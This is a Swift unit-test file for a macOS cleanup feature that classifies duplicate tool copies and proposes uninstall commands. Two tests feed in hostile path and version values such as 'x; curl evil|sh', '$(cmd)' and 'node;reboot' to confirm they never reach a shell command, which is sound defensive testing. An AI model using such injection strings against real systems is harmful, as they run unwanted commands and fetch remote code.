import XCTest
@testable import MacUpdaterCore

private final class ScriptedBrew: CleanupBrewQuerying, @unchecked Sendable {
    private let uses: [String: [String]]
    private let error: Error?
    private let failingFormulas: Set<String>
    private let lock = NSLock()
    private var recorded: [String] = []

    init(uses: [String: [String]] = [:], error: Error? = nil, failingFormulas: Set<String> = []) {
        self.uses = uses
        self.error = error
        self.failingFormulas = failingFormulas
    }

    var calls: [String] { lock.withLock { recorded } }

    func usesInstalled(formula: String) async throws -> [String] {
        lock.withLock { recorded.append(formula) }
        if let error { throw error }
        if failingFormulas.contains(formula) { throw BrewFailure() }
        return uses[formula] ?? []
    }
}

private struct BrewFailure: Error {}

/// Two copies of one Homebrew package: the one the active copy resolves to and an older one.
private struct SharedPackage {
    let source: CleanupSource
    let current: String
    let older: String
}

final class CleanupDuplicateFindingsTests: XCTestCase {
    private var tmp: CleanupTempHome!
    private var brewPrefix: URL!
    private var processes: [CleanupProcess] = []

    override func setUpWithError() throws {
        tmp = try CleanupTempHome()
        brewPrefix = tmp.url("opt/homebrew")
        processes = []
    }

    private func builder(_ brew: ScriptedBrew = ScriptedBrew()) -> CleanupDuplicateFindings {
        let guarded = GuardedCleanupFileSystem(
            base: LiveCleanupFileSystem(trash: { _ in }),
            guard: ProtectedLocationGuard(home: tmp.home, mounts: FixedMountTable(["/"]))
        )
        return CleanupDuplicateFindings(
            brew: brew,
            inspector: FakeProcessInspector(processes: processes, bootTime: Date(timeIntervalSince1970: 0)),
            fileSystem: guarded, brewPrefix: brewPrefix, home: tmp.home
        )
    }

    private func copy(
        _ path: URL, real: URL? = nil, source: CleanupSource, version: String? = nil, role: CleanupCopyRole, index: Int
    ) -> CleanupCopy {
        CleanupCopy(
            path: path, realpath: real ?? path, pathIndex: index, source: source, version: version,
            identity: CleanupFileIdentity(device: 1, inode: UInt64(index + 1)), role: role
        )
    }

    private func scan(_ name: String, _ copies: [CleanupCopy]) -> CleanupPathScan {
        CleanupPathScan(groups: [CleanupToolGroup(name: name, copies: copies)], skippedProtected: [], missingDirectories: [])
    }

    private func shadowed(
        source: CleanupSource, version: String? = "2.1.311", activeVersion: String? = "2.1.325", real: URL? = nil
    ) -> CleanupPathScan {
        let active = copy(
            tmp.url(".local/bin/tool"), source: .standalone, version: activeVersion, role: .active, index: 0
        )
        let other = copy(tmp.url("bin2/tool"), real: real, source: source, version: version, role: .shadowed, index: 1)
        return scan("tool", [active, other])
    }

    private func shadowedFinding(_ result: (findings: [CleanupFinding], notes: [CleanupDetectorNote])) throws -> CleanupFinding {
        try XCTUnwrap(result.findings.first { $0.status != .active })
    }

    func testShadowedCaskGetsUninstallCaskAndIsSafeWhenOlder() async throws {
        let real = try tmp.file("opt/homebrew/Caskroom/claude-code/2.1.311/claude", size: 4096, executable: true)
        let result = await builder().build(shadowed(source: .homebrewCask(token: "claude-code"), real: real))

        let finding = try shadowedFinding(result)
        XCTAssertEqual(finding.action, .brew(.uninstallCask("claude-code")))
        XCTAssertEqual(finding.bucket, .safe)
        XCTAssertEqual(finding.status, .shadowed)
        XCTAssertEqual(finding.reason, .shadowedBy(path: tmp.url(".local/bin/tool").path))
        XCTAssertGreaterThan(try XCTUnwrap(finding.size), 0)
        XCTAssertEqual(finding.detector, .pathDuplicates)
        XCTAssertEqual(finding.tool, "tool")
    }

    func testShadowedFormulaWithoutDependentsGetsUninstallFormula() async throws {
        let real = try tmp.file("opt/homebrew/Cellar/gh/2.104.0/bin/gh", executable: true)
        let result = await builder().build(shadowed(source: .homebrewFormula(name: "gh"), version: "2.104.0", activeVersion: nil, real: real))

        let finding = try shadowedFinding(result)
        XCTAssertEqual(finding.action, .brew(.uninstallFormula("gh")))
        XCTAssertEqual(finding.bucket, .needsDecision)
    }

    /// `brew uninstall` removes the whole formula or cask, so a shadowed copy from the package that
    /// also provides the active copy (a versioned `Cellar/<f>/<v>/bin` on PATH beside the prefix's
    /// `bin`) is never offered for removal.
    func testShadowedCopyFromTheActiveCopysPackageHasNoAction() async throws {
        let packages = [
            SharedPackage(
                source: .homebrewFormula(name: "node"), current: "opt/homebrew/Cellar/node/23.1.0/bin/node",
                older: "opt/homebrew/Cellar/node/22.11.0/bin/node"
            ),
            SharedPackage(
                source: .homebrewCask(token: "claude-code"), current: "opt/homebrew/Caskroom/claude-code/2.1.325/claude",
                older: "opt/homebrew/Caskroom/claude-code/2.1.311/claude"
            ),
        ]
        for package in packages {
            let current = try tmp.file(package.current, size: 64, executable: true)
            let older = try tmp.file(package.older, size: 64, executable: true)
            let active = copy(tmp.url("opt/homebrew/bin/tool"), real: current, source: package.source, version: "23.1.0", role: .active, index: 0)
            let shadowed = copy(older, real: older, source: package.source, version: "2.0.0", role: .shadowed, index: 1)

            let finding = try shadowedFinding(await builder().build(scan("tool", [active, shadowed])))

            XCTAssertEqual(finding.status, .shadowed, "\(package.source)")
            XCTAssertEqual(finding.action, .none, "\(package.source)")
            XCTAssertEqual(finding.bucket, .needsDecision, "\(package.source)")
        }
    }

    func testFormulaWithDependentsIsExcludedAsDependency() async throws {
        let real = try tmp.file("opt/homebrew/Cellar/python@3.15/3.15.0/bin/python3", executable: true)
        let dependents = ["mlx", "mlx-c", "nmap", "ollama"]
        let brew = ScriptedBrew(uses: ["python@3.15": dependents])
        let result = await builder(brew).build(shadowed(source: .homebrewFormula(name: "python@3.15"), version: "3.15.0", real: real))

        let finding = try shadowedFinding(result)
        XCTAssertEqual(finding.status, .dependency(dependents))
        XCTAssertEqual(finding.reason, .requiredBy(dependents))
        XCTAssertEqual(finding.action, .none)
        XCTAssertEqual(finding.bucket, .excluded)
    }

    func testAppProvidedLinkGetsAdminInstruction() async throws {
        let result = await builder().build(shadowed(source: .appBundle(name: "Ollama")))

        let finding = try shadowedFinding(result)
        XCTAssertEqual(finding.action, .instruction(.removeAppLinkWithAdminRights(link: tmp.url("bin2/tool").path)))
    }

    func testExpectedSystemCopyHasNoActionAndNoSize() async throws {
        let system = copy(URL(filePath: "/usr/bin/tool", directoryHint: .notDirectory), source: .system, role: .expected, index: 1)
        let active = copy(tmp.url(".local/bin/tool"), source: .standalone, role: .active, index: 0)
        let result = await builder().build(scan("tool", [active, system]))

        let finding = try XCTUnwrap(result.findings.first { $0.status == .expected })
        XCTAssertEqual(finding.action, .none)
        XCTAssertEqual(finding.reason, .systemCopy)
        XCTAssertEqual(finding.bucket, .excluded)
        XCTAssertNil(finding.size)
        let activeFinding = try XCTUnwrap(result.findings.first { $0.status == .active })
        XCTAssertEqual(activeFinding.reason, .currentVersion)
        XCTAssertEqual(activeFinding.action, .none)
    }

    func testBrokenLinkHasNoAction() async throws {
        let broken = copy(tmp.url("bin2/tool"), real: nil, source: .standalone, role: .brokenLink, index: 1)
        let active = copy(tmp.url(".local/bin/tool"), source: .standalone, role: .active, index: 0)
        let result = await builder().build(scan("tool", [active, broken]))

        let finding = try XCTUnwrap(result.findings.first { $0.status == .brokenLink })
        XCTAssertEqual(finding.reason, .brokenLink)
        XCTAssertEqual(finding.action, .none)
        XCTAssertEqual(finding.bucket, .excluded)
    }

    func testMissingHomebrewDegradesToANote() async throws {
        let real = try tmp.file("opt/homebrew/Cellar/gh/2.104.0/bin/gh", executable: true)
        let result = await builder(ScriptedBrew(error: BrewServiceError.brewNotFound))
            .build(shadowed(source: .homebrewFormula(name: "gh"), version: "2.104.0", real: real))

        XCTAssertEqual(result.notes, [CleanupDetectorNote(detector: .homebrew, kind: .homebrewUnavailable)])
        let finding = try shadowedFinding(result)
        XCTAssertEqual(finding.status, .shadowed)
        XCTAssertEqual(finding.action, .none)
        XCTAssertEqual(result.findings.count, 2)
    }

    func testOtherBrewErrorIsOneFailedNote() async throws {
        let real = try tmp.file("opt/homebrew/Cellar/gh/2.104.0/bin/gh", executable: true)
        let result = await builder(ScriptedBrew(error: BrewFailure()))
            .build(shadowed(source: .homebrewFormula(name: "gh"), version: "2.104.0", real: real))

        XCTAssertEqual(result.notes, [CleanupDetectorNote(detector: .homebrew, kind: .failed)])
        XCTAssertEqual(try shadowedFinding(result).action, .none)
    }

    func testStandaloneFileGetsTrashWithItsSize() async throws {
        let real = try tmp.file("bin2/tool", size: 8192, executable: true)
        let result = await builder().build(shadowed(source: .standalone, version: nil, activeVersion: nil, real: real))

        let finding = try shadowedFinding(result)
        XCTAssertEqual(finding.action, .trash([tmp.url("bin2/tool")]))
        XCTAssertEqual(finding.bucket, .needsDecision)
        XCTAssertGreaterThan(try XCTUnwrap(finding.size), 0)
    }

    func testStandaloneInsideVersionDirectoryIsLeftToTheCreatingTool() async throws {
        try tmp.file("apps/tool/1.0.0/bin/tool", executable: true)
        let real = try tmp.file("apps/tool/2.0.0/bin/tool", executable: true)
        let result = await builder().build(shadowed(source: .standalone, version: nil, real: real))

        XCTAssertEqual(try shadowedFinding(result).action, .instruction(.removeWithCreatingTool))
    }

    func testPackageManagerCommands() async throws {
        let prefix = tmp.home.path
        let cases: [String: (source: CleanupSource, action: CleanupAction)] = [
            "lib/node_modules/@scope/pkg/bin/tool": (.packageManager(.npm), .command("npm uninstall -g --prefix \(prefix) @scope/pkg")),
            "lib/node_modules/plain/bin/tool": (.packageManager(.npm), .command("npm uninstall -g --prefix \(prefix) plain")),
            ".local/pipx/venvs/black/bin/tool": (.packageManager(.pipx), .command("pipx uninstall black")),
            ".cargo/bin/tool": (.packageManager(.cargo), .instruction(.removeWithCreatingTool)),
            ".bun/bin/tool": (.packageManager(.bun), .instruction(.removeWithCreatingTool)),
            ".fnm/node/bin/tool": (.versionManager(.fnm), .instruction(.removeWithCreatingTool)),
        ]
        for (relative, expected) in cases {
            let finding = try shadowedFinding(await builder().build(shadowed(source: expected.source, real: tmp.url(relative))))
            XCTAssertEqual(finding.action, expected.action, relative)
        }
    }

    /// `npm uninstall -g` alone acts on the prefix of whichever `npm` comes first on `PATH`, which
    /// is the node install providing the active copy; the command names the shadowed copy's own.
    func testNpmCommandNamesTheShadowedCopysPrefix() async throws {
        let installs = [
            "opt/homebrew": "opt/homebrew/lib/node_modules/typescript/bin/tsc",
            ".local/share/fnm/node-versions/v22.11.0/installation":
                ".local/share/fnm/node-versions/v22.11.0/installation/lib/node_modules/@scope/pkg/bin/tool",
        ]
        let packages = ["opt/homebrew": "typescript", ".local/share/fnm/node-versions/v22.11.0/installation": "@scope/pkg"]
        for (prefix, real) in installs {
            let finding = try shadowedFinding(await builder().build(shadowed(source: .packageManager(.npm), real: tmp.url(real))))
            let expected = "npm uninstall -g --prefix \(tmp.url(prefix).path) \(packages[prefix] ?? "")"
            XCTAssertEqual(finding.action, .command(expected), prefix)
        }
    }

    func testNpmCommandWithAnUnsafePrefixIsLeftToTheCreatingTool() async throws {
        for prefix in ["node install", "node;reboot", "-node", "node$(id)"] {
            let real = tmp.url("\(prefix)/lib/node_modules/typescript/bin/tsc")
            let finding = try shadowedFinding(await builder().build(shadowed(source: .packageManager(.npm), real: real)))
            XCTAssertEqual(finding.action, .instruction(.removeWithCreatingTool), prefix)
        }
    }

    func testUvCommands() async throws {
        let tool = try shadowedFinding(await builder().build(shadowed(
            source: .versionManager(.uv), real: tmp.url(".local/share/uv/tools/ruff/bin/tool")
        )))
        XCTAssertEqual(tool.action, .command("uv tool uninstall ruff"))
        let python = try shadowedFinding(await builder().build(shadowed(
            source: .versionManager(.uv), version: "3.12.4", real: tmp.url(".local/share/uv/python/cpython-3.12.4/bin/tool")
        )))
        XCTAssertEqual(python.action, .command("uv python uninstall 3.12.4"))
    }

    func testAppManagedSystemAndNativeCopiesHaveNoAction() async throws {
        for source in [CleanupSource.appManaged(owner: "X"), .system, .nativeVersionDirectory(tool: "tool")] {
            let finding = try shadowedFinding(await builder().build(shadowed(source: source)))
            XCTAssertEqual(finding.action, .none, "\(source)")
        }
    }

    func testRunningProcessMakesTheCopyInUseAndHighRisk() async throws {
        let real = try tmp.file("bin2/tool", executable: true)
        let process = CleanupProcess(pid: 7, name: "tool", executablePath: real.path, arguments: [])
        processes = [process]
        let result = await builder().build(shadowed(source: .standalone, real: real))

        let finding = try shadowedFinding(result)
        XCTAssertEqual(finding.status, .inUse([process]))
        XCTAssertEqual(finding.risk, .high)
        XCTAssertEqual(finding.bucket, .needsDecision)
    }

    func testNewerShadowedCopyNeedsDecision() async throws {
        let result = await builder().build(shadowed(source: .homebrewCask(token: "c"), version: "3.0.0", activeVersion: "2.0.0", real: tmp.url("opt/homebrew/Caskroom/c/3.0.0/c")))
        XCTAssertEqual(try shadowedFinding(result).bucket, .needsDecision)
    }

    func testUnsafePathComponentsNeverReachACommand() async throws {
        let hostile = ["x; curl evil|sh", "$(cmd)", "a b", "line\nbreak", "-flag", "..", "`id`"]
        for name in hostile {
            let sources: [(CleanupSource, String)] = [
                (.packageManager(.pipx), ".local/pipx/venvs/\(name)/bin/tool"),
                (.packageManager(.npm), "lib/node_modules/\(name)/bin/tool"),
                (.packageManager(.npm), "lib/node_modules/@scope/\(name)/bin/tool"),
                (.versionManager(.uv), ".local/share/uv/tools/\(name)/bin/tool"),
            ]
            for (source, relative) in sources {
                let finding = try shadowedFinding(await builder().build(shadowed(source: source, real: tmp.url(relative))))
                XCTAssertEqual(finding.action, .instruction(.removeWithCreatingTool), "\(name) in \(relative)")
            }
        }
        let finding = try shadowedFinding(await builder().build(shadowed(
            source: .versionManager(.uv), version: "3.12; reboot",
            real: tmp.url(".local/share/uv/python/cpython-3.12/bin/tool")
        )))
        XCTAssertEqual(finding.action, .instruction(.removeWithCreatingTool))
    }

    func testFailedLookupKeepsEarlierResultsAndDegradesOnlyUncheckedFormulas() async throws {
        let first = try tmp.file("opt/homebrew/Cellar/aaa/1.0.0/bin/aaa", executable: true)
        let second = try tmp.file("opt/homebrew/Cellar/bbb/1.0.0/bin/bbb", executable: true)
        let active = copy(tmp.url(".local/bin/aaa"), source: .standalone, version: "9.0.0", role: .active, index: 0)
        let activeB = copy(tmp.url(".local/bin/bbb"), source: .standalone, version: "9.0.0", role: .active, index: 0)
        let one = copy(tmp.url("bin2/aaa"), real: first, source: .homebrewFormula(name: "aaa"), version: "1.0.0", role: .shadowed, index: 1)
        let two = copy(tmp.url("bin2/bbb"), real: second, source: .homebrewFormula(name: "bbb"), version: "1.0.0", role: .shadowed, index: 1)
        let input = CleanupPathScan(
            groups: [CleanupToolGroup(name: "aaa", copies: [active, one]), CleanupToolGroup(name: "bbb", copies: [activeB, two])],
            skippedProtected: [], missingDirectories: []
        )
        let result = await builder(ScriptedBrew(uses: ["aaa": ["dep"]], failingFormulas: ["bbb"])).build(input)

        XCTAssertEqual(result.notes, [CleanupDetectorNote(detector: .homebrew, kind: .failed)])
        let firstFinding = try XCTUnwrap(result.findings.first { $0.tool == "aaa" && $0.status != .active })
        XCTAssertEqual(firstFinding.status, .dependency(["dep"]))
        let secondFinding = try XCTUnwrap(result.findings.first { $0.tool == "bbb" && $0.status != .active })
        XCTAssertEqual(secondFinding.status, .shadowed)
        XCTAssertEqual(secondFinding.action, .none)
        XCTAssertEqual(secondFinding.bucket, .needsDecision)
    }

    func testOneLookupPerDistinctFormulaAcrossGroups() async throws {
        let real = try tmp.file("opt/homebrew/Cellar/gh/2.0.0/bin/gh", executable: true)
        func group(_ name: String) -> CleanupToolGroup {
            let active = copy(tmp.url(".local/bin/\(name)"), source: .standalone, version: "9.0.0", role: .active, index: 0)
            let other = copy(tmp.url("bin2/\(name)"), real: real, source: .homebrewFormula(name: "gh"), version: "2.0.0", role: .shadowed, index: 1)
            return CleanupToolGroup(name: name, copies: [active, other])
        }
        let brew = ScriptedBrew()
        _ = await builder(brew).build(CleanupPathScan(groups: [group("one"), group("two")], skippedProtected: [], missingDirectories: []))
        XCTAssertEqual(brew.calls, ["gh"])
    }
}
